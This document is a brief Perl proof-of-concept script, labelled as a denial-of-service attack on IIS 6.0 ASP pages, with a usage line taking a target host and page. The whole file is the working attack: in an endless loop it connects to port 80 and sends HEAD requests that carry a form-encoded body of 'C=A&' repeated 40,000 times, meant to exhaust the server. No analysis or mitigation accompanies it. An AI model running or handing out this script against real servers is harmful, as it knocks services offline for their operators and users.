# IIS 6.0 ASP DoS PoC
# usage: perl IISdos.pl <host> <asp page>
use IO::Socket;
$|=1;
$host = $ARGV[0];
$script = $ARGV[1];
while(1) {
$sock = IO::Socket::INET->new(PeerAddr => $host,
                   PeerPort => 'http(80)',
                   Proto => 'tcp');
$write = "C=A&" x 40000;
print $sock "HEAD /$script HTTP/1.1\r\nHost: $host\r\n"
           ."Connection:Close\r\nContent-Type: application/x-www-form-urlencoded\r\n"
           ."Content-Length:". length($write) ."\r\n\r\n" . $write;
print ".";
while(<$sock>) {
           print;
}
}
